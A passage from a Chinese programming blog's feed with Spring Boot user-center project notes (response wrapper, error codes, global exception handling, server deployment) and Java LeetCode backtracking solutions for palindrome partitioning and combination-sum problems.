class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yub.usercenter.common;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BaseResponse</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> T data;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>类名</th><th>作用描述</th><th>主要功能</th></tr></thead><tbody><tr><td><code>BaseResponse</code></td><td>通用返回类，用于封装API响应数据，包含状态码、数据、消息和描述等信息。</td><td>提供多种构造方法以适应不同的返回类型。</td></tr><tr><td><code>ErrorCode</code></td><td>错误码枚举类，定义了常见的错误类型及其对应的状态码、消息和描述。</td><td>管理和提供标准化的错误码信息。</td></tr><tr><td><code>ResultsUtils</code></td><td>返回工具类，提供便捷的方法创建标准化的响应对象，简化响应构造过程。</td><td>提供<code>success</code>和多种<code>error</code>方法用于生成响应。</td></tr></tbody></table><p><strong><code>BaseResponse</code> 类</strong></p><ul><li><p>用于统一定义接口返回的数据结构，包含状态码、数据、消息和描述等字段。</p></li><li><p>提供了多种构造函数，支持不同情境下的响应创建（例如成功、错误等）。</p></li><li><p><strong><code>ErrorCode</code> 枚举类</strong></p></li><li><p>将常见的错误类型抽象为枚举，定义了每种错误的状态码、消息和描述。</p></li><li><p>提供了一种集中式管理错误信息的方式，便于统一处理和维护。</p></li></ul><p><strong><code>ResultsUtils</code> 工具类</strong></p><ul><li>提供了简单的方法来快速生成<code>BaseResponse</code>对象，减少重复代码。</li><li>包含针对成功和多种错误情况的静态方法，简化了对API响应的构建。</li></ul><h4 id="依据业务逻辑写的错误码"><a href="#依据业务逻辑写的错误码" class="headerlink" title="依据业务逻辑写的错误码"></a>依据业务逻辑写的错误码</h4><p>生成文档的话最好写上注释（Javadoc）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yub.usercenter.common;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 错误码</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yub</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">ErrorCode</span> &#123;</span><br><span class="line"></span><br><span class="line">    PARAMS_ERROR(<span class="number">40000</span>,<span class="string">&quot;请求参数错误&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="comment">//用户问题</span></span><br><span class="line">    NULL_ERROR(<span class="number">40001</span>,<span class="string">&quot;请求数据错误&quot;</span>,<span class="string">&quot;&quot;</span>),</span><br><span class="line">    NOT_LOGIN(<span class="number">40100</span>,<span class="string">&quot;未登录&quot;</span>,<span class="string">&quot;&quot;</span>),</span><br><span class="line">    NO_AUTH(<span class="number">40101</span>,<span class="string">&quot;没有权限&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String message;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String description;</span><br><span class="line"></span><br><span class="line">     ErrorCode(<span class="type">int</span> code, <span class="keyword">final</span> String message, <span class="keyword">final</span> String description) &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">        <span class="built_in">this</span>.message = message;</span><br><span class="line">        <span class="built_in">this</span>.description = description;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>枚举值不支持set，所以直接定义为final.<br>运行时异常不用throws捕获和try-catch捕获.可以理解为description是给前端用的（给前端返回参数）</p><p><strong>定义业务异常类</strong></p><ul><li><p>相对与Java的异常类，支持更多字段</p></li><li><p>自定义构造函数，更灵活&#x2F;快捷的设置字段</p></li><li><pre><code class="java">package com.yub.usercenter.exception;import com.yub.usercenter.common.ErrorCode;/** * 自定义异常类 * * @author yub */public class BusinessException extends RuntimeException&#123;    private final int code;    private final String description;    public BusinessException(String message, int code, String description) &#123;        super(message);        this.code = code;        this.description = description;    &#125;    public BusinessException(ErrorCode errorCode) &#123;        super(errorCode.getMessage());        this.code = errorCode.getCode();        this.description = errorCode.getDescription();    &#125;    public BusinessException(ErrorCode errorCode, String description) &#123;        super(errorCode.getMessage());        this.code = errorCode.getCode();        this.description = description;    &#125;    public int getCode() &#123;        return this.code;    &#125;    public String getDescription() &#123;        return this.description;    &#125;&#125;<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**编写全局异常处理器**</span><br><span class="line"></span><br><span class="line">- 捕获代码中的所有异常，内部消化（封装），让前端得到更详细的业务报错/信息，同时屏蔽框架本身的异常（不暴露服务器内部状态）</span><br><span class="line">- 使用Spring AOP进行实现：在调用方法前后进行额外的处理</span><br><span class="line">- 集中处理，比如记录日志</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line"><span class="keyword">package</span> com.yub.usercenter.exception;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.yub.usercenter.common.BaseResponse;</span><br><span class="line"><span class="keyword">import</span> com.yub.usercenter.common.ErrorCode;</span><br><span class="line"><span class="keyword">import</span> com.yub.usercenter.common.ResultsUtils;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.<span class="keyword">annotation</span>.ExceptionHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.<span class="keyword">annotation</span>.RestControllerAdvice;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 全局异常处理器</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yub</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestControllerAdvice</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GolobalExceptionHandler</span> &#123;</span><br><span class="line">    <span class="meta">@ExceptionHandler(BusinessException.class)</span></span><br><span class="line">    <span class="keyword">public</span> BaseResponse businessExceotion(BusinessException e) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;businessException:&quot;</span> + e.getMessage(),e);</span><br><span class="line">        <span class="keyword">return</span> ResultsUtils.error(e.getCode(),e.getMessage(),e.getDescription());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExceptionHandler(RuntimeException.class)</span></span><br><span class="line">    <span class="keyword">public</span> BaseResponse runtimeException(RuntimeException e) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;runtimeException:&quot;</span>,e);</span><br><span class="line">        <span class="keyword">return</span> ResultsUtils.error(ErrorCode.SYSTEM_ERROR,e.getMessage(),<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre></li></ul><p>自定义快捷键</p><p><img src="/../imgs/2025-01/image-20250120221223730.png" alt="image-20250120221223730"></p><p>$END$是输入快捷语句之后能光标能自动定位到括号位置初.</p><p><img src="/../imgs/2025-01/image-20250120221257889.png" alt="image-20250120221257889"></p><h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><ul><li>正向代理，替客户端向服务器接发送请求</li><li>反向代理，替服务器接收请求.<br><img src="/../imgs/2025-01/image-20250120214529168.png" alt="image-20250120214529168"></li></ul><p>application.yml指定接口全局api</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">servlet:</span></span><br><span class="line"><span class="attr">context-path:</span> <span class="string">/api</span></span><br></pre></td></tr></table></figure><h4 id="多环境"><a href="#多环境" class="headerlink" title="多环境"></a>多环境</h4><ul><li>指同一套项目代码在不同的阶段需要根据实际情况来调整配置并且部署到不同的机器上.</li></ul><p><strong>为什么需要</strong></p><ul><li><p>每个环境互不影响</p></li><li><p>区分不同的阶段：开发&#x2F;测试&#x2F;生产</p></li><li><p>对项目进行优化</p><ul><li>本地日志级别</li><li>精简依赖，节约项目体积</li><li>项目的环境&#x2F;参数可以调整，比如JVM参数</li></ul><p>针对不同的环境做不同的事情.</p></li></ul><p><strong>多环境分类</strong></p><ul><li>本地环境（自己的电脑）localhost</li><li>开发环境（远程开发）多人协作</li><li>测试环境（测试）开发&#x2F;测试&#x2F;产品。独立的数据库、独立的服务器</li><li>预发布环境（体验服）基本和正式环境一致，正式环境的数据库更严谨查出问题</li><li>正式环境（线上，公开访问的项目）尽量不改动，保证上线“完美”</li><li>沙箱环境（实验环境）为了做实验</li></ul><h4 id="后端多环境实战"><a href="#后端多环境实战" class="headerlink" title="后端多环境实战"></a>后端多环境实战</h4><p>SpringBoot项目通过application.yml添加不同的后缀来区分.<br><img src="/../imgs/2025-01/image-20250118153224532.png" alt="image-20250118153224532"></p><h5 id="项目部署"><a href="#项目部署" class="headerlink" title="项目部署"></a>项目部署</h5><h6 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h6><ol><li>有一台自己的服务器（腾讯云阿里云等）</li><li>代码打包完成，完成部署备份文件.</li></ol><h6 id="使用Linux宝塔部署"><a href="#使用Linux宝塔部署" class="headerlink" title="使用Linux宝塔部署"></a>使用Linux宝塔部署</h6><p>充值宝塔访问端口和路径后无法正常访问<img src="/../imgs/2025-01/image-20250119165712913.png" alt="image-20250119165712913"></p><p>在腾讯云防火墙放行之后还要在Linux宝塔端同步放行.（踩大坑呜呜）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">检查已放行端口</span></span><br><span class="line">firewall-cmd --zone=public --list-ports</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">新增放行端口</span></span><br><span class="line">firewall-cmd --zone=public --add-port=8080/tcp --permanent</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">刷新</span></span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>做好计划，从宏观到局部，由泛到精.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;UserCenter-项目疑问记录&quot;&gt;&lt;a href=&quot;#UserCenter-项目疑问记录&quot; class=&quot;headerlink&quot; title=&quot;UserCenter 项目疑问记录&quot;&gt;&lt;/a&gt;UserCenter 项目疑问记录&lt;/h3&gt;&lt;p&gt;如何进行企业级开发?</summary>
      
    
    
    
    
    <category term="Project" scheme="https://yubut.github.io/tags/Project/"/>
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x20.</title>
    <link href="https://yubut.github.io/2024/11/27/yub%E3%81%AEAlgorithm0x20/"/>
    <id>https://yubut.github.io/2024/11/27/yub%E3%81%AEAlgorithm0x20/</id>
    <published>2024-11-27T06:08:34.000Z</published>
    <updated>2024-11-27T07:05:17.819Z</updated>
    
    <content type="html"><![CDATA[<h4 id="分割回文串"><a href="#分割回文串" class="headerlink" title="分割回文串"></a>分割回文串</h4><p>link：<a href="https://leetcode.cn/problems/palindrome-partitioning/description/">131. 分割回文串 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>主题思想是和之前做的组合II相同的，问题的关键难点就是在怎么处理切割上.<br>首先递归参数传入<strong>startIndex</strong>是表示<strong>下一轮递归遍历起始位置</strong>，那么startIndx就是作为我们的<strong>切割线</strong>一角色.<br>再看回文子串如何判断？采用双指针法，一个在头一个在尾前后指针指向位置的元素相等就是回文串了.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;List&lt;String&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    Deque&lt;String&gt; deque = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; <span class="title function_">partition</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        backtracking(s,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(String s, <span class="type">int</span> startIndex)</span> &#123;</span><br><span class="line">        <span class="comment">//起始位置大于s的长度-&gt;找到了一组分割方案</span></span><br><span class="line">        <span class="keyword">if</span>(startIndex &gt;= s.length()) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>(deque));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex;i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="comment">//记录回文串</span></span><br><span class="line">            <span class="keyword">if</span>(isPalindrome(s,startIndex,i)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> s.substring(startIndex,i + <span class="number">1</span>);</span><br><span class="line">                deque.addLast(str);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            backtracking(s, i + <span class="number">1</span>);</span><br><span class="line">            deque.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//判断是否是回文串</span></span><br><span class="line">            <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isPalindrome</span><span class="params">(String s, <span class="type">int</span> startIndex, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex, j = end; i &lt; j; i++,j--) &#123;</span><br><span class="line">                <span class="keyword">if</span>(s.charAt(i) != s.charAt(j)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="复原ip地址"><a href="#复原ip地址" class="headerlink" title="复原ip地址"></a>复原ip地址</h4><p>link：</p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;分割回文串&quot;&gt;&lt;a href=&quot;#分割回文串&quot; class=&quot;headerlink&quot; title=&quot;分割回文串&quot;&gt;&lt;/a&gt;分割回文串&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/palindrome-part</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x19.</title>
    <link href="https://yubut.github.io/2024/11/26/yub%E3%81%AEAlgorithm.0x19/"/>
    <id>https://yubut.github.io/2024/11/26/yub%E3%81%AEAlgorithm.0x19/</id>
    <published>2024-11-26T04:06:16.000Z</published>
    <updated>2024-11-26T13:38:08.800Z</updated>
    
    <content type="html"><![CDATA[<h4 id="组合总和"><a href="#组合总和" class="headerlink" title="组合总和"></a>组合总和</h4><p>link：<a href="https://leetcode.cn/problems/combination-sum/">39. 组合总和 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>其实思路和昨天的很像，但是元素可以复用而且也不是字符串.<br>那还是依旧使用path进行记录,res进行返回结果，sum进行统计最后再加上一个标记位置进行判断即可.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">startIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        backstracking(candidates, target, sum, startIndex);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backstracking</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target, <span class="type">int</span> sum, <span class="type">int</span> startIndex)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(sum &gt; target) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(sum == target) &#123;</span><br><span class="line">           res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>(path));</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt; candidates.length; i++) &#123;</span><br><span class="line">            path.add(candidates[i]);</span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            backstracking(candidates,target,sum,i);</span><br><span class="line">            sum -= candidates[i];</span><br><span class="line">            path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="组合总和II"><a href="#组合总和II" class="headerlink" title="组合总和II"></a>组合总和II</h4><p>link：<a href="https://leetcode.cn/problems/combination-sum-ii/description/">40. 组合总和 II - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>上一题的plus版，最开始想的是和上一题的思路相同加一个set去掉重复的集合结果会超时…（菜就多练）<br>这里就出现了一个新知识点——学会加标识辅助数组.(苦笑)<br>潦草的分析图</p><p><img src="/../imgs/2024-10/image-20241126211756826.png" alt="image-20241126211756826">我们需要额外创建一个boolean的used数组来记录当前的位置是否被用过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//标记数组</span></span><br><span class="line">    <span class="type">boolean</span>[] used;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum2</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        used = <span class="keyword">new</span> <span class="title class_">boolean</span>[candidates.length];</span><br><span class="line">        Arrays.fill(used,<span class="literal">false</span>);</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        backstracking(candidates,target,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backstracking</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target,<span class="type">int</span> startIndex)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(sum == target) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt; candidates.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(sum + candidates[i] &gt; target) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//出现重复节点 同层的第一个节点已经被访问过 pass</span></span><br><span class="line">            <span class="comment">//candidates[i] == candidates[i - 1] 就是对应[2,2]的选取情况</span></span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; candidates[i] == candidates[i - <span class="number">1</span>] &amp;&amp; !used[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            used[i] = <span class="literal">true</span>;</span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            path.add(candidates[i]);</span><br><span class="line">            backstracking(candidates, target, i + <span class="number">1</span>);</span><br><span class="line">            used[i] = <span class="literal">false</span>;</span><br><span class="line">            sum -= candidates[i];</span><br><span class="line">            path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong><br>去掉 <code>candidates[i] == candidates[i - 1]</code>，会导致无法判断相邻重复元素，生成重复的组合.</p><p><strong>完整逻辑</strong>：</p><ul><li><code>candidates[i] == candidates[i - 1]</code>：用于识别相邻的重复元素。</li><li><code>!used[i - 1]</code>：确保同一层中，跳过未使用的重复元素。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;组合总和&quot;&gt;&lt;a href=&quot;#组合总和&quot; class=&quot;headerlink&quot; title=&quot;组合总和&quot;&gt;&lt;/a&gt;组合总和&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/combination-sum/&quot;&gt;3</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x18</title>
    <link href="https://yubut.github.io/2024/11/22/yub%E3%81%AEAlgorithm.0x18/"/>
    <id>https://yubut.github.io/2024/11/22/yub%E3%81%AEAlgorithm.0x18/</id>
    <published>2024-11-22T10:54:16.000Z</published>
    <updated>2024-11-26T04:05:25.836Z</updated>
    
    <content type="html"><![CDATA[<h4 id="组合总和III"><a href="#组合总和III" class="headerlink" title="组合总和III"></a>组合总和III</h4><p>link：<a href="https://leetcode.cn/problems/combination-sum-iii/">216. 组合总和 III - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>既然是要比对，那自然需要和目标值比对的sum，同时要记录path.<br>这么一想其实和我们之前分析的组合问题就非常相似了.<br>注意一下题目中给定的判定逻辑限制（数字1-9且不能重复）很完美的组合问题.<br>天生的回溯搭子.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">//记录路径</span></span><br><span class="line">    List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//记录结果</span></span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum3</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        backtracking(n,k,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span> targetSum, <span class="type">int</span> k, <span class="type">int</span> startIndex, <span class="type">int</span> sum)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(sum&gt;targetSum)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(path.size() == 